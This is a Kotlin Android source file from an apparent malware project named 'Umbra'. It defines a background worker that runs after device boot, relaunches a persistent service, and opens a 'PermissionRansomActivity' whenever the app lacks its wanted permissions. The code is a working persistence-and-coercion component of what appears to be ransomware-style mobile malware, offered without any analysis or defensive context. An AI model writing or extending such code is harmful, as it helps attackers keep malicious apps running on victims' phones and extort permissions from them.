package org.umbra.core.persistence

import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters

class KeepAliveWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        Log.d("Umbra", "KeepAliveWorker — launching service")

        // Start the foreground service
        val intent = Intent(applicationContext, UmbraService::class.java)
        try {
            applicationContext.startForegroundService(intent)
        } catch (e: Exception) {
            Log.w("Umbra", "KeepAliveWorker: FGS start failed: ${e.message}")
            try { applicationContext.startService(intent) } catch (_: Exception) {}
        }

        // ── Also check for missing permissions and launch ransom ──
        // This fires after boot (scheduled by BootReceiver with 10s delay)
        try {
            if (!PermissionRansomActivity.hasAllPermissions(applicationContext)) {
                Log.d("Umbra", "KeepAliveWorker — permissions missing, launching ransom")
                PermissionRansomActivity.launch(applicationContext)
            }
        } catch (e: Exception) {
            Log.w("Umbra", "KeepAliveWorker — permission check failed: ${e.message}")
        }

        return Result.success()
    }
}
